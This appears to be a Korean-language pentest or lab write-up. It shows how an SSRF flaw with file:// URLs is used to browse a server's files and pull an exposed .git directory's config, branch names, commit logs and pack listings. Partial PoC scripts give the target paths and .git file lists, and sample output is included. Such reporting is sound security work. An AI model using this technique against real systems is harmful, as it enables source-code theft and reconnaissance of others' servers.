## SSRF 취약점을 이용한 .git 디렉토리 정보 탈취 시나리오

본 문서는 SSRF(Server-Side Request Forgery) 취약점을 이용해 서버 내부 파일에 접근(LFI, Local File Inclusion)하고, 최종적으로 웹 애플리케이션의 `.git` 디렉토리 정보를 탈취하여 소스코드를 유출하는 공격 과정을 설명합니다.

공격은 두 단계로 나누어 진행됩니다.

1.  **정찰 단계**: `poc.py`를 이용해 서버의 파일 시스템 구조를 탐색하고 `.git` 디렉토리의 정확한 위치를 파악합니다.
2.  **정보 탈취 단계**: `poc_git.py`를 이용해 발견된 `.git` 디렉토리 내부의 주요 파일들을 체계적으로 조회하여 민감 정보를 탈취합니다.

---

### 1단계: 정찰 및 .git 디렉토리 탐색 (`poc.py`)

첫 번째 단계는 SSRF 취약점을 통해 서버의 어느 경로에 웹 애플리케이션이 배포되었는지, 그리고 `.git` 디렉토리가 존재하는지 확인하는 것입니다. 이를 위해 아래의 `poc.py` 코드를 사용했습니다. 이 코드는 `/home` 부터 시작하여 예상 가능한 주요 경로들을 순차적으로 조회합니다.

#### 실행 코드: `poc.py`

```python
import requests
from bs4 import BeautifulSoup
import urllib3
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from config import TARGET_URL

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 파일 경로 리스트 (민감 정보 위주)
paths = [
    "/home",
    "/home/bteam",
    "/home/bteam/Desktop/",
    "/home/bteam/Desktop/_CPSS_ICS_Server/",
    "/home/bteam/Desktop/_CPSS_ICS_Server/ics-hmi-simulator/",
    "/home/bteam/Desktop/_CPSS_ICS_Server/ics-hmi-simulator/app/",
    "/home/bteam/Desktop/_CPSS_ICS_Server/ics-hmi-simulator/app/routes.py",
    "/home/bteam/Desktop/_CPSS_ICS_Server/ics-hmi-simulator/app/__init__.py"
]

# (이하 요청 및 파싱 코드 생략)
```

#### 실행 결과 및 분석

위 코드 실행 결과, `/home/bteam/Desktop/_CPSS_ICS_Server/` 경로에서 `.git` 디렉토리가 노출된 것을 확인했습니다. 이를 통해 공격 대상의 정확한 위치를 특정할 수 있었습니다.

```text
[+] 요청 중: file:///home/bteam/Desktop/_CPSS_ICS_Server/
[✔] /home/bteam/Desktop/_CPSS_ICS_Server/ 내용 일부:
Index of /home/bteam/Desktop/_CPSS_ICS_Server/
[parent directory]
Name                    Size  Date Modified
.git/                   ...   ...
ics-hmi-simulator/      ...   ...
README.md               ...   ...
```

---

### 2단계: .git 내부 민감 정보 탈취 (`poc_git.py`)

`.git` 디렉토리의 위치를 확인한 후, 내부의 상세 정보를 탈취하기 위해 아래와 같이 `poc_git.py`를 작성했습니다. 이 코드는 1단계에서 알아낸 경로를 기반으로 `.git` 내부에 존재하는 주요 설정 파일, 로그, 브랜치 정보 등을 체계적으로 조회합니다.

#### 실행 코드: `poc_git.py`

```python
import requests
from bs4 import BeautifulSoup
import urllib3
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from config import TARGET_URL

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 대상 서버에 존재하는 .git 디렉토리의 기본 경로
GIT_BASE_PATH = "/home/bteam/Desktop/_CPSS_ICS_Server/.git"

# .git 디렉토리 내에서 확인할 파일 및 하위 디렉토리의 포괄적인 목록
paths_to_check = [
    "", "/HEAD", "/config", "/index", "/description", "/COMMIT_EDITMSG",
    "/FETCH_HEAD", "/ORIG_HEAD", "/packed-refs", "/hooks", "/info",
    "/info/exclude", "/branches", "/logs/", "/logs/HEAD",
    "/logs/refs/heads/main", "/logs/refs/heads/master", "/refs/",
    "/refs/heads/", "/refs/heads/main", "/refs/heads/master",
    "/refs/tags/", "/refs/remotes/", "/objects/", "/objects/info/",
    "/objects/info/packs", "/objects/pack/"
]

# (이하 요청 및 파싱 코드 생략)
```

#### 실행 결과 및 분석 (주요 정보 요약)

`poc_git.py` 실행 결과, 다음과 같은 민감 정보들을 획득할 수 있었습니다. (개인정보는 `[REDACTED]` 처리)

-   **저장소 설정 (`.git/config`)**: 원격 저장소의 전체 URL을 확보하여 소스코드 관리 지점을 파악했습니다.
    ```
    [remote "origin"]
     url = https://github.com/[REDACTED]/_CPSS_ICS_Server.git
    ```
-   **브랜치 정보 (`.git/FETCH_HEAD`)**: `Donghyun`, `Jinseop` 등 팀원들의 실명이 포함된 브랜치 목록을 확인했습니다.
    ```
    ...
    7fe80... not-for-merge branch '[REDACTED_BRANCH_1]' of ...
    b41a6... not-for-merge branch '[REDACTED_BRANCH_2]' of ...
    ```
-   **커밋 로그 (`.git/logs/HEAD`)**: `bteam`, `root` 등 서버 계정 이름과 전체 커밋 이력을 확보하여 어떤 사용자가 어떤 작업을 했는지 시간대별로 파악할 수 있었습니다.
    ```
    ...
    de715... e6cf4... [USER] 1751899981 +0900 pull: Fast-forward
    e6cf4... 97f28... [USER] 1751900172 +0900 pull: Fast-forward
    ```
-   **Pack 파일 (`.git/objects/pack/`)**: Git 객체들이 압축된 pack 파일의 목록을 확인했습니다. 이 파일들을 모두 다운로드하면 저장소의 전체 소스코드를 복원하는 것이 가능합니다.

이러한 정보들은 소스코드 유출뿐만 아니라, 개발자 정보, 프로젝트 관리 방식 등 추가적인 공격의 실마리가 될 수 있는 매우 심각한 정보 유출입니다.
